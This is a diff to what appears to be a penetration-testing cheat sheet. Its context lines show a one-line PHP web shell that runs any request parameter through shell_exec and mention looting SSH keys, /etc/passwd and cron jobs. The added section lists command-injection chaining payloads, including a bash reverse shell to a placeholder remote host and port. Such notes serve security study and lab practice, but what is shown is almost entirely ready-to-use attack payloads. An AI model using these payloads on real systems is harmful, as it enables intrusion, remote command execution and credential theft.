@@ -205,7 +205,7 @@ or
 <?php echo shell_exec($_REQUEST["cmd"]); ?>
 ```
 
-## Reverse Shell
+##  Shell
 ### PHP
 ```
 <?php
@@ -322,7 +322,13 @@ ss -lntp
 Check for interesting files:
 ssh keys, logs file (if got permission), /etc/passwd, /opt, cronjob
 
-
+## Chaining commands:
+If we can run certain commands on the server, check if we can chain commands
+```
+;ls
+&pwd
+;bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'
+```
 
 
 ## Some notes:
